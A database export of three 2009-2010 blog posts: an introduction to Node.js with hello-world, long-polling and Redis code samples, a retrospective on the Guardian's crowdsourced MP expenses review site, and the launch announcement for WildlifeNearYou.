		<field name="id">1594</field>
		<field name="title">Node.js is genuinely exciting</field>
		<field name="slug">node</field>
		<field name="body">&lt;p&gt;I gave a talk on Friday at &lt;a href=&quot;http://2009.full-frontal.org/&quot;&gt;Full Frontal&lt;/a&gt;, a new one day JavaScript conference in my home town of Brighton. I ended up throwing away my intended topic (JSONP, APIs and cross-domain security) three days before the event in favour of a technology which first crossed my radar &lt;a href=&quot;http://simonwillison.net/2009/Nov/9/node/&quot;&gt;less than two weeks ago&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;That technology is Ryan Dahl's &lt;a href=&quot;http://nodejs.org/&quot;&gt;Node&lt;/a&gt;. It's the most exciting new project I've come across in quite a while.&lt;/p&gt;

&lt;p&gt;At first glance, Node looks like yet another take on the idea of server-side JavaScript, but it's a lot more interesting than that. It builds on JavaScript's excellent support for event-based programming and uses it to create something that truly plays to the strengths of the language.&lt;/p&gt;

&lt;p&gt;Node describes itself as &quot;evented I/O for V8 javascript&quot;. It's a toolkit for writing extremely high performance non-blocking event driven network servers in JavaScript. Think similar to &lt;a href=&quot;http://twistedmatrix.com/&quot;&gt;Twisted&lt;/a&gt; or &lt;a href=&quot;http://rubyeventmachine.com/&quot;&gt;EventMachine&lt;/a&gt; but for JavaScript instead of Python or Ruby.&lt;/p&gt;

&lt;h4&gt;Evented I/O?&lt;/h4&gt;

&lt;p&gt;As I discussed in my talk, event driven servers are a powerful alternative to the threading / blocking mechanism used by most popular server-side programming frameworks. Typical frameworks can only handle a small number of requests simultaneously, dictated by the number of server threads or processes available. Long-running operations can tie up one of those threads - enough long running operations at once and the server runs out of available threads and becomes unresponsive. For large amounts of traffic, each request must be handled as quickly as possible to free the thread up to deal with the next in line.&lt;/p&gt;

&lt;p&gt;This makes certain functionality extremely difficult to support. Examples include handling large file uploads, combining resources from multiple backend web APIs (which themselves can take an unpredictable amount of time to respond) or providing comet functionality by holding open the connection until a new event becomes available.&lt;/p&gt;

&lt;p&gt;Event driven programming takes advantage of the fact that network servers spend most of their time waiting for I/O operations to complete. Operations against in-memory data are incredibly fast, but anything that involves talking to the filesystem or over a network inevitably involves waiting around for a response.&lt;/p&gt;

&lt;p&gt;With Twisted, EventMachine and Node, the solution lies in specifying I/O operations in conjunction with callbacks. A single event loop rapidly switches between a list of tasks, firing off I/O operations and then moving on to service the next request. When the I/O returns, execution of that particular request is picked up again.&lt;/p&gt;

&lt;p&gt;(In the talk, I attempted to illustrate this with a questionable metaphor involving &lt;a href=&quot;http://www.slideshare.net/simon/evented-io-based-web-servers-explained-using-bunnies&quot;&gt;hamsters, bunnies and a hyperactive squid&lt;/a&gt;).&lt;/p&gt;

&lt;h4&gt;What makes Node exciting?&lt;/h4&gt;

&lt;p&gt;If systems like this already exist, what's so exciting about Node? Quite a few things:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;JavaScript is extremely well suited to programming with callbacks&lt;/strong&gt;. Its anonymous function syntax and closure support is perfect for defining inline callbacks, and client-side development in general uses event-based programming as a matter of course: run this function when the user clicks here / when the Ajax response returns / when the page loads. JavaScript programmers already understand how to build software in this way.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Node represents a clean slate&lt;/strong&gt;. Twisted and EventMachine are hampered by the existence of a large number of blocking libraries for their respective languages. Part of the difficulty in learning those technologies is understanding which Python or Ruby libraries you can use and which ones you have to avoid. Node creator Ryan Dahl has a stated aim for Node to never provide a blocking API - even filesystem access and DNS lookups are catered for with non-blocking callback based APIs. This makes it much, much harder to screw things up.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Node is small&lt;/strong&gt;. I read through the &lt;a href=&quot;http://nodejs.org/api.html&quot;&gt;API documentation&lt;/a&gt; in around half an hour and felt like I had a pretty comprehensive idea of what Node does and how I would achieve things with it.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Node is fast&lt;/strong&gt;. V8 is the fast and keeps getting faster. Node's event loop uses Marc Lehmann's highly regarded &lt;a href=&quot;http://software.schmorp.de/pkg/libev.html&quot;&gt;libev&lt;/a&gt; and &lt;a href=&quot;http://software.schmorp.de/pkg/libeio.html&quot;&gt;libeio&lt;/a&gt; libraries. Ryan Dahl is himself something of a speed demon - he just replaced Node's HTTP parser implementation (already pretty speedy due to it's Ragel / Mongrel heritage) with a &lt;a href=&quot;http://four.livejournal.com/1033160.html&quot;&gt;hand-tuned C implementation&lt;/a&gt; with some impressive characteristics.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Easy to get started&lt;/strong&gt;. Node ships with all of its dependencies, and compiles cleanly on Snow Leopard out of the box.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With both my JavaScript and server-side hats on, Node just feels right. The APIs make sense, it fits a clear niche and despite its youth (the project started in February) everything feels solid and well constructed. The rapidly growing community is further indication that Ryan is on to something great here.&lt;/p&gt;

&lt;h4&gt;What does Node look like?&lt;/h4&gt;

&lt;p&gt;Here's how to get Hello World running in Node in 7 easy steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;samp&gt;git clone git://github.com/ry/node.git&lt;/samp&gt; (or download and extract &lt;a href=&quot;http://github.com/ry/node/archives/master&quot; title=&quot;Download ry/node from GitHub&quot;&gt;a tarball&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;./configure&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;make&lt;/samp&gt; (takes a while, it needs to compile V8 as well)&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;sudo make install&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;Save the below code as &lt;samp&gt;helloworld.js&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;node helloworld.js&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;Visit &lt;samp&gt;http://localhost:8080/&lt;/samp&gt; in your browser&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here's helloworld.js:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var sys = require('sys'), 
  http = require('http');

http.createServer(function(req, res) {
  res.sendHeader(200, {'Content-Type': 'text/html'});
  res.sendBody('&amp;lt;h1&amp;gt;Hello World&amp;lt;/h1&amp;gt;');
  res.finish();
}).listen(8080);

sys.puts('Server running at http://127.0.0.1:8080/');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you have Apache Bench installed, try running &lt;samp&gt;ab -n 1000 -c 100 'http://127.0.0.1:8080/'&lt;/samp&gt; to test it with 1000 requests using 100 concurrent connections. On my MacBook Pro I get 3374 requests a second.&lt;/p&gt;

&lt;p&gt;So Node is fast - but where it really shines is concurrency with long running requests. Alter the helloworld.js server definition to look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;http.createServer(function(req, res) {
  setTimeout(function() {
    res.sendHeader(200, {'Content-Type': 'text/html'});
    res.sendBody('&amp;lt;h1&amp;gt;Hello World&amp;lt;/h1&amp;gt;');
    res.finish();
  }, 2000);
}).listen(8080);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We're using &lt;samp&gt;setTimeout&lt;/samp&gt; to introduce an artificial two second delay to each request. Run the benchmark again - I get 49.68 requests a second, with every single request taking between 2012 and 2022 ms. With a two second delay, the best possible performance for 1000 requests 100 at a time is  &lt;em&gt;1000 requests / (1000 / 100) * 2 seconds = 50 requests a second&lt;/em&gt;. Node hits it pretty much bang on the nose.&lt;/p&gt;

&lt;p&gt;The most important line in the above examples is &lt;code&gt;res.finish()&lt;/code&gt;. This is the mechanism Node provides for explicitly signalling that a request has been fully processed and should be returned to the browser. By making it explicit, Node makes it easy to implement comet patterns like long polling and streaming responses - stuff that is decidedly non trivial in most server-side frameworks.&lt;/p&gt;

&lt;h4&gt;djangode&lt;/h4&gt;

&lt;p&gt;Node's core APIs are pretty low level - it has HTTP client and server libraries, DNS handling, asynchronous file I/O etc, but it doesn't give you much in the way of high level web framework APIs. Unsurprisingly, this has lead to a cambrian explosion of lightweight web frameworks based on top of Node - the &lt;a href=&quot;http://wiki.github.com/ry/node&quot;&gt;projects using node page&lt;/a&gt; lists a bunch of them. Rolling a framework is a great way of learning a low-level API, so I've thrown together my own - &lt;a href=&quot;http://github.com/simonw/djangode&quot;&gt;djangode&lt;/a&gt; - which brings Django's regex-based URL handling to Node along with a few handy utility functions. Here's a simple djangode application:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var dj = require('./djangode');

var app = dj.makeApp([
  ['^/$', function(req, res) {
    dj.respond(res, 'Homepage');
  }],
  ['^/other$', function(req, res) {
    dj.respond(res, 'Other page');
  }],
  ['^/page/(\\d+)$', function(req, res, page) {
    dj.respond(res, 'Page ' + page);
  }]
]);
dj.serve(app, 8008);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;djangode is currently a throwaway prototype, but I'll probably be extending it with extra functionality as I explore more Node related ideas.&lt;/p&gt;

&lt;h4&gt;nodecast&lt;/h4&gt;

&lt;p&gt;My main demo in the Full Frontal talk was nodecast, an extremely simple broadcast-oriented comet application. Broadcast is my favourite &quot;hello world&quot; example for comet because it's both simpler than chat and more realistic - I've been involved in plenty of projects that could benefit from being able to broadcast events to their audience, but few that needed an interactive chat room.&lt;/p&gt;

&lt;p&gt;The source code for the version I demoed can be found on GitHub in &lt;a href=&quot;http://github.com/simonw/nodecast/tree/no-redis&quot;&gt;the no-redis branch&lt;/a&gt;. It's a very simple application - the client-side JavaScript simply uses jQuery's getJSON method to perform long-polling against a simple URL endpoint:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;function fetchLatest() {
  $.getJSON('/wait?id=' + last_seen, function(d) {
    $.each(d, function() {
      last_seen = parseInt(this.id, 10) + 1;
      ul.prepend($('&amp;lt;li&amp;gt;&amp;lt;/li&amp;gt;').text(this.text));
    });
    fetchLatest();
  });
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Doing this recursively is probably a bad idea since it will eventually blow the browser's JavaScript stack, but it works OK for the demo.&lt;/p&gt;

&lt;p&gt;The more interesting part is the server-side &lt;samp&gt;/wait&lt;/samp&gt; URL which is being polled. Here's the relevant Node/djangode code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var message_queue = new process.EventEmitter();

var app = dj.makeApp([
  // ...
  ['^/wait$', function(req, res) {
    var id = req.uri.params.id || 0;
    var messages = getMessagesSince(id);
    if (messages.length) {
      dj.respond(res, JSON.stringify(messages), 'text/plain');
    } else {
      // Wait for the next message
      var listener = message_queue.addListener('message', function() {
        dj.respond(res, 
          JSON.stringify(getMessagesSince(id)), 'text/plain'
        );
        message_queue.removeListener('message', listener);
        clearTimeout(timeout);
      });
      var timeout = setTimeout(function() {
        message_queue.removeListener('message', listener);
        dj.respond(res, JSON.stringify([]), 'text/plain');
      }, 10000);
    }
  }]
  // ...
]);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The wait endpoint checks for new messages and, if any exist, returns immediately. If there are no new messages it does two things: it hooks up a listener on the &lt;samp&gt;message_queue&lt;/samp&gt; EventEmitter (Node's equivalent of jQuery/YUI/Prototype's custom events) which will respond and end the request when a new message becomes available, and also sets a timeout that will cancel the listener and end the request after 10 seconds. This ensures that long polls don't go on too long and potentially cause problems - as far as the browser is concerned it's just talking to a JSON resource which takes up to ten seconds to load.&lt;/p&gt;

&lt;p&gt;When a message does become available, calling &lt;samp&gt;message_queue.emit('message')&lt;/samp&gt; will cause all waiting requests to respond with the latest set of messages.&lt;/p&gt;

&lt;h4&gt;Talking to databases&lt;/h4&gt;

&lt;p&gt;nodecast keeps track of messages using an in-memory JavaScript array, which works fine until you restart the server and lose everything. How do you implement persistent storage?&lt;/p&gt;

&lt;p&gt;For the moment, the easiest answer lies with the NoSQL ecosystem. Node's focus on non-blocking I/O makes it hard (but not impossible) to hook it up to regular database client libraries. Instead, it strongly favours databases that speak simple protocols over a TCP/IP socket - or even better, databases that communicate over HTTP. So far I've tried using CouchDB (with &lt;a href=&quot;http://github.com/sixtus/node-couch&quot;&gt;node-couch&lt;/a&gt;) and redis (with &lt;a href=&quot;http://github.com/fictorial/redis-node-client&quot;&gt;redis-node-client&lt;/a&gt;), and both worked extremely well. nodecast &lt;a href=&quot;http://github.com/simonw/nodecast&quot;&gt;trunk&lt;/a&gt; now uses redis to store the message queue, and provides a nice example of working with a callback-based non-blocking database interface:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var db = redis.create_client();
var REDIS_KEY = 'nodecast-queue';

function addMessage(msg, callback) {
  db.llen(REDIS_KEY, function(i) {
    msg.id = i; // ID is set to the queue length
    db.rpush(REDIS_KEY, JSON.stringify(msg), function() {
      message_queue.emit('message', msg);
      callback(msg);
    });
  });
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Relational databases are coming to Node. Ryan has a &lt;a href=&quot;http://github.com/ry/node_postgres&quot;&gt;PostgreSQL adapter&lt;/a&gt; in the works, thanks to that database already featuring a mature non-blocking client library. MySQL will be a bit tougher - Node will need to grow a separate thread pool to integrate with the official client libs - but you can talk to MySQL right now by dropping in &lt;a href=&quot;http://code.nytimes.com/projects/dbslayer&quot;&gt;DBSlayer&lt;/a&gt; from the NY Times which provides an HTTP interface to a pool of MySQL servers.&lt;/p&gt;

&lt;h4&gt;Mixed environments&lt;/h4&gt;

&lt;p&gt;I don't see myself switching all of my server-side development over to JavaScript, but Node has definitely earned a place in my toolbox. It shouldn't be at all hard to mix Node in to an existing server-side environment - either by running both behind a single HTTP proxy (being event-based itself, &lt;a href=&quot;http://nginx.net/&quot;&gt;nginx&lt;/a&gt; would be an obvious fit) or by putting Node applications on a separate subdomain. Node is a tempting option for anything involving comet, file uploads or even just mashing together potentially slow loading web APIs. Expect to hear a lot more about it in the future.&lt;/p&gt;

&lt;h4&gt;Further reading&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://s3.amazonaws.com/four.livejournal/20091117/jsconf.pdf&quot;&gt;Ryan's JSConf.eu presentation&lt;/a&gt; is the best discussion I've seen anywhere of the design philosophy behind Node.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://nodejs.org/api.html&quot;&gt;Node's API documentation&lt;/a&gt; is essential reading.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://debuggable.com/posts/streaming-file-uploads-with-node-js:4ac094b2-b6c8-4a7f-bd07-28accbdd56cb&quot;&gt;Streaming file uploads with node.js&lt;/a&gt; illustrates how well suited Node is to accepting large file uploads.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://groups.google.com/group/nodejs&quot;&gt;The nodejs Google Group&lt;/a&gt; is the hub of the Node community.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2009-11-23 12:50:22</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1595</field>
		<field name="title">Crowdsourced document analysis and MP expenses</field>
		<field name="slug">crowdsourcing</field>
		<field name="body">&lt;p&gt;As &lt;a href=&quot;http://www.guardian.co.uk/politics/mps-expenses&quot;&gt;you may have heard&lt;/a&gt;, the UK government released a fresh batch of MP expenses documents a week ago on Thursday. I spent that week working with a small team at Guardian HQ to prepare for the release. Here's what we built:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://mps-expenses2.guardian.co.uk/&quot;&gt;http://mps-expenses2.guardian.co.uk/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It's a crowdsourcing application that asks the public to help us dig through and categorise the enormous stack of documents - around 30,000 pages of claim forms, scanned receipts and hand-written letters, all scanned and published as PDFs.&lt;/p&gt;

&lt;p&gt;This is the second time we've tried this - the first was back in June, and can be seen at &lt;a href=&quot;http://mps-expenses.guardian.co.uk/&quot;&gt;mps-expenses.guardian.co.uk&lt;/a&gt;. Last week's attempt was an opportunity to apply the lessons we learnt the first time round.&lt;/p&gt;

&lt;p&gt;Writing crowdsourcing applications in a newspaper environment is a fascinating challenge. Projects have very little notice - I heard about the new document release the Thursday before giving less than a week to put everything together. In addition to the fast turnaround for the application itself, the 48 hours following the release are crucial. The news cycle moves fast, so if the application launches but we don't manage to get useful data out of it quickly the story will move on before we can impact it.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.scalecamp.org.uk/&quot;&gt;ScaleCamp&lt;/a&gt; on the Friday meant that development work didn't properly kick off until Monday morning. The bulk of the work was performed by two server-side developers, one client-side developer, one designer and one QA on Monday, Tuesday and Wednesday. The Guardian operations team deftly handled our EC2 configuration and deployment, and we had some extra help on the day from other members of the technology department. After launch we also had a number of journalists helping highlight discoveries and dig through submissions.&lt;/p&gt;

&lt;p&gt;The system was written using Django, MySQL (InnoDB), Redis and memcached.&lt;/p&gt;

&lt;h4&gt;Asking the right question&lt;/h4&gt;

&lt;p&gt;The biggest mistake we made the first time round was that we asked the wrong question. We tried to get our audience to categorise documents as either &quot;claims&quot; or &quot;receipts&quot; and to rank them as &quot;not interesting&quot;, &quot;a bit interesting&quot;, &quot;interesting but already known&quot; and &quot;someone should investigate this&quot;. We also asked users to optionally enter any numbers they saw on the page as categorised &quot;line items&quot;, with the intention of adding these up later.&lt;/p&gt;

&lt;p&gt;The line items, with hindsight, were a mistake. 400,000 documents makes for a huge amount of data entry and for the figures to be useful we would need to confirm their accuracy. This would mean yet more rounds of crowdsourcing, and the job was so large that the chance of getting even one person to enter line items for each page rapidly diminished as the news story grew less prominent.&lt;/p&gt;

&lt;p&gt;The categorisations worked reasonably well but weren't particularly interesting - knowing if a document is a claim or receipt is useful only if you're going to collect line items. The &quot;investigate this&quot; button worked very well though.&lt;/p&gt;

&lt;p&gt;We completely changed our approach for the new system. We dropped the line item task and instead asked our users to categories each page by applying one or more tags, from a small set that our editors could control. This gave us a lot more flexibility - we changed the tags shortly before launch based on the characteristics of the documents - and had the potential to be a lot more fun as well. I'm particularly fond of the &quot;hand-written&quot; tag, which has highlighted some &lt;a href=&quot;http://mps-expenses2.guardian.co.uk/page/1062/&quot;&gt;lovely examples&lt;/a&gt; of correspondence between MPs and the expenses office.&lt;/p&gt;

&lt;p&gt;Sticking to an editorially assigned set of tags provided a powerful tool for directing people's investigations, and also ensured our users didn't start creating potentially libellous tags of their own.&lt;/p&gt;

&lt;h4&gt;Breaking it up in to assignments&lt;/h4&gt;

&lt;p&gt;For the first project, everyone worked together on the same task to review all of the documents. This worked fine while the document set was small, but once we had loaded in 400,000+ pages the progress bar become quite depressing.&lt;/p&gt;

&lt;p&gt;This time round, we added a new concept of &quot;&lt;a href=&quot;http://mps-expenses2.guardian.co.uk/assignment/&quot;&gt;assignments&lt;/a&gt;&quot;. Each assignment consisted of the set of pages belonging to a specified list of MPs, documents or political parties. Assignments had a threshold, so we could specify that a page must be reviewed by at least X people before it was considered reviewed. An editorial tool let us feature one &quot;main&quot; assignment and several alternative assignments right on the homepage.&lt;/p&gt;

&lt;p&gt;Clicking &quot;start reviewing&quot; on an assignment sets a cookie for that assignment, and adds the assignment's progress bar to the top of the review interface. New pages are selected at random from the set of unreviewed pages in that assignment.&lt;/p&gt;

&lt;p&gt;The assignments system proved extremely effective. We could use it to direct people to the highest value documents (our top hit list of interesting MPs, or members of the shadow cabinet) while still allowing people with specific interests to pick an alternative task.&lt;/p&gt;

&lt;h4&gt;Get the button right!&lt;/h4&gt;

&lt;p&gt;Having run two crowdsourcing projects I can tell you this: the single most important piece of code you will write is the code that gives someone something new to review. Both of our projects had big &quot;start reviewing&quot; buttons. Both were broken in different ways.&lt;/p&gt;

&lt;p&gt;The first time round, the mistakes were around scalability. I used a SQL &quot;ORDER BY RAND()&quot; statement to return the next page to review. I knew this was an inefficient operation, but I assumed that it wouldn't matter since the button would only be clicked occasionally.&lt;/p&gt;

&lt;p&gt;Something like 90% of our database load turned out to be caused by that one SQL statement, and it only got worse as we loaded more pages in to the system. This caused multiple site slow downs and crashes until we threw together a cron job that pushed 1,000 unreviewed page IDs in to memcached and made the button pick one of those at random.&lt;/p&gt;

&lt;p&gt;This solved the performance problem, but meant that our user activity wasn't nearly as well targeted. For optimum efficiency you really want everyone to be looking at a different page - and a random distribution is almost certainly the easiest way to achieve that.&lt;/p&gt;

&lt;p&gt;The second time round I turned to my new favourite in-memory data structure server, &lt;a href=&quot;http://code.google.com/p/redis/&quot;&gt;redis&lt;/a&gt;, and its &lt;a href=&quot;http://code.google.com/p/redis/wiki/SrandmemberCommand&quot;&gt;SRANDMEMBER&lt;/a&gt; command (a feature I &lt;a href=&quot;http://twitter.com/simonw/status/5027987857&quot;&gt;requested&lt;/a&gt; a while ago with this exact kind of project in mind). The system maintains a redis set of all IDs that needed to be reviewed for an assignment to be complete, and a separate set of IDs of all pages had been reviewed. It then uses redis set intersection (the &lt;a href=&quot;http://code.google.com/p/redis/wiki/SdiffstoreCommand&quot;&gt;SDIFFSTORE&lt;/a&gt; command) to create a set of unreviewed pages for the current assignment and then SRANDMEMBER to pick one of those pages.&lt;/p&gt;

&lt;p&gt;This is where the bug crept in. Redis was just being used as an optimisation - the single point of truth for whether a page had been reviewed or not stayed as MySQL. I wrote a couple of Django management commands to repopulate the denormalised Redis sets should we need to manually modify the database. Unfortunately I missed some - the sets that tracked what pages were available in each document. The assignment generation code used an intersection of these sets to create the overall set of documents for that assignment. When we deleted some pages that had accidentally been imported twice I failed to update those sets.&lt;/p&gt;

&lt;p&gt;This meant the &quot;next page&quot; button would occasionally turn up a page that didn't exist. I had some very poorly considered fallback logic for that - if the random page didn't exist, the system would return the first page in that assignment instead. Unfortunately, this meant that when the assignment was down to the last four non-existent pages every single user was directed to the same page - which subsequently attracted well over a thousand individual reviews.&lt;/p&gt;

&lt;p&gt;Next time, I'm going to try and make the &quot;next&quot; button completely bullet proof! I'm also going to maintain a &quot;denormalisation dictionary&quot; documenting every denormalisation in the system in detail - such a thing would have saved me several hours of confused debugging.&lt;/p&gt;

&lt;h4&gt;Exposing the results&lt;/h4&gt;

&lt;p&gt;The biggest mistake I made last time was not getting the data back out again fast enough for our reporters to effectively use it. It took 24 hours from the launch of the application to the moment the first reporting feature was added - mainly because we spent much of the intervening time figuring out the scaling issues.&lt;/p&gt;

&lt;p&gt;This time we handled this a lot better. We provided private pages exposing all recent activity on the site. We also provided public pages for each of the tags, as well as combination pages for party + tag, MP + tag, document + tag, assignment + tag and user + tag. Most of these pages were ordered by most-tagged, with the hope that the most interesting pages would quickly bubble to the top.&lt;/p&gt;

&lt;p&gt;This worked pretty well, but we made one key mistake. The way we were ordering pages meant that it was almost impossible to paginate through them and be sure that you had seen everything under a specific tag. If you're trying to keep track of everything going on in the site, reliable pagination is essential. The only way to get reliable pagination on a fast moving site is to order by the date something was first added to a set in ascending order. That way you can work through all of the pages, wait a bit, hit &quot;refresh&quot; and be able to continue paginating where you left off. Any other order results in the content of each page changing as new content comes in.&lt;/p&gt;

&lt;p&gt;We eventually added an undocumented /in-order/ URL prefix to address this issue. Next time I'll pay a lot more attention to getting the pagination options right from the start.&lt;/p&gt;

&lt;h4&gt;Rewarding our contributors&lt;/h4&gt;

&lt;p&gt;The reviewing experience the first time round was actually quite lonely. We deliberately avoided showing people how others had marked each page because we didn't want to bias the results. Unfortunately this meant the site felt like a bit of a ghost town, even when hundreds of other people were actively reviewing things at the same time.&lt;/p&gt;

&lt;p&gt;For the new version, we tried to provide a much better feeling of activity around the site. We added &quot;top reviewer&quot; tables to every assignment, MP and political party as well as a &quot;most active reviewers in the past 48 hours&quot; table on the homepage (this feature was added to the first project several days too late). User profile pages got a lot more attention, with more of a feel that users were collecting their favourite pages in to tag buckets within their profile.&lt;/p&gt;

&lt;p&gt;Most importantly, we added a concept of &lt;a href=&quot;http://mps-expenses2.guardian.co.uk/discoveries/&quot;&gt;discoveries&lt;/a&gt; - editorially highlighted pages that were shown on the homepage and credited to the user that had first highlighted them. These discoveries also added valuable editorial interest to the site, showing up on the homepage and also the index pages for &lt;a href=&quot;http://mps-expenses2.guardian.co.uk/labour/&quot;&gt;political parties&lt;/a&gt; and &lt;a href=&quot;http://mps-expenses2.guardian.co.uk/conservative/gerald-howarth/&quot;&gt;individual MPs&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Light-weight registration&lt;/h4&gt;

&lt;p&gt;For both projects, we implemented an extremely light-weight form of registration. Users can start reviewing pages without going through any signup mechanism, and instead are assigned a cookie and an anon-454 style username the first time they review a document. They are then encouraged to assign themselves a proper username and password so they can log in later and take credit for their discoveries.&lt;/p&gt;

&lt;p&gt;It's difficult to tell how effective this approach really is. I have a strong hunch that it dramatically increases the number of people who review at least one document, but without a formal A/B test it's hard to tell how true that is. The UI for this process in the first project was quite confusing - we gave it a solid makeover the second time round, which seems to have resulted in a higher number of conversions.&lt;/p&gt;

&lt;h4&gt;Overall lessons&lt;/h4&gt;

&lt;p&gt;News-based crowdsourcing projects of this nature are both challenging and an enormous amount of fun. For the best chances of success, be sure to ask the right question, ensure user contributions are rewarded, expose as much data as possible and make the &quot;next thing to review&quot; behaviour rock solid. I'm looking forward to the next opportunity to apply these lessons, although at this point I &lt;em&gt;really&lt;/em&gt; hope it involves something other than MPs' expenses.&lt;/p&gt;</field>
		<field name="created">2009-12-20 12:07:53</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1596</field>
		<field name="title">WildlifeNearYou: It began on a fort...</field>
		<field name="slug">wildlifenearyou</field>
		<field name="body">&lt;p&gt;Back in October 2008, myself and 11 others set out on the first &lt;a href=&quot;http://devfort.com/&quot;&gt;/dev/fort&lt;/a&gt; expedition. The idea was simple: gather a dozen geeks, rent a fort, take food and laptops and see what we could build in a week.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/nataliedowne/4269421697/in/set-72157623197922000/&quot;&gt;&lt;img src=&quot;http://simonwillison.net/static/2010/fort-clonque.jpg&quot; width=&quot;450&quot; height=&quot;186&quot; alt=&quot;Fort Clonque&quot; title=&quot;Fort Clonque, by Natalie Downe&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The fort was &lt;a href=&quot;http://www.anotherurl.com/travel/fort_clonque/handbook.htm&quot;&gt;Fort Clonque&lt;/a&gt; on &lt;a href=&quot;http://en.wikipedia.org/wiki/Alderney&quot;&gt;Alderney&lt;/a&gt; in the Channel Islands, managed by the &lt;a href=&quot;http://www.landmarktrust.org.uk/&quot;&gt;Landmark Trust&lt;/a&gt;. We spent an incredibly entertaining week there exploring Nazi bunkers, cooking, eating and coding up a storm. It ended up taking &lt;em&gt;slightly&lt;/em&gt; longer than a week to finish, but 14 months later the result of our combined efforts can finally be revealed: &lt;a href=&quot;http://www.wildlifenearyou.com/&quot;&gt;WildlifeNearYou.com&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;WildlifeNearYou is a site for people who like to see animals. Have you ever wanted to know where your nearest Llama is? Search for &quot;&lt;a href=&quot;http://www.wildlifenearyou.com/search/?q=llamas+near+brighton&quot;&gt;llamas near brighton&lt;/a&gt;&quot; and you'll see that there's one 18 miles away at &lt;a href=&quot;http://www.wildlifenearyou.com/gb/ashdown-forest-llama-farm/&quot;&gt;Ashdown Forest Llama Farm&lt;/a&gt;. Or you can see &lt;a href=&quot;http://www.wildlifenearyou.com/fr/&quot;&gt;all the places we know about in France&lt;/a&gt;, or &lt;a href=&quot;http://www.wildlifenearyou.com/simon/tripbook/&quot;&gt;all the trips I've been on&lt;/a&gt;, or &lt;a href=&quot;http://www.wildlifenearyou.com/animals/red-panda/&quot;&gt;everywhere you can see a Red Panda&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The data comes from user contributions: you can use WildlifeNearYou to track your trips to wildlife places and list the animals that you see there. We can only tell you about animals that someone else has already spotted.&lt;/p&gt;

&lt;p&gt;Once you've added some trips, you can import your Flickr photos and match them up with trips and species. We'll be adding a feature in the future that will push machine tags and other metadata back to Flickr for you, if you so choose.&lt;/p&gt;

&lt;p&gt;You can read more about WildlifeNearYou on the site's &lt;a href=&quot;http://www.wildlifenearyou.com/about/&quot;&gt;about page&lt;/a&gt; and &lt;a href=&quot;http://www.wildlifenearyou.com/about/faq/&quot;&gt;FAQ&lt;/a&gt;. Please don't hesitate to send us &lt;a href=&quot;http://www.wildlifenearyou.com/feedback/&quot;&gt;feedback&lt;/a&gt;!&lt;/p&gt;

&lt;h4&gt;What took so long?&lt;/h4&gt;

&lt;p&gt;So why did it take so long to finally launch it? A whole bunch of reasons. Week long marathon hacking sessions are an amazing way to generate a ton of interesting ideas and build a whole bunch of functionality, but it's very hard to get a single cohesive whole at the end of it. Tying up the loose ends is a pretty big job and is severely hampered by the fort residents returning to their real lives, where hacking for 5 hours straight on a cool easter egg suddenly doesn't seem quite so appealing. We also got stuck in a cycle of &quot;just one more thing&quot;. On the fort we didn't have internet access, so internet-dependent features like Freebase integration, Google Maps, Flickr imports and OpenID had to be left until later (&quot;they'll only take a few hours&quot; no longer works once you're off /dev/fort time).&lt;/p&gt;

&lt;p&gt;The biggest problem though was perfectionism. The longer a side-project drags on for, the more important it feels to make it &quot;just perfect&quot; before releasing it to the world. Finally, on New Year's Day, &lt;a href=&quot;http://natbat.net/&quot;&gt;Nat&lt;/a&gt; and I decided we had had enough. Our resolution was to &quot;ship the thing within a week, no matter what state it's in&quot;. We're a few days late, but it's finally live.&lt;/p&gt;

&lt;p&gt;WildlifeNearYou is by far the most fun website I've ever worked on. To all twelve of my &lt;a href=&quot;http://www.wildlifenearyou.com/about/#team_avatars&quot;&gt;intrepid fort companions&lt;/a&gt;: congratulations - we made a thing!&lt;/p&gt;

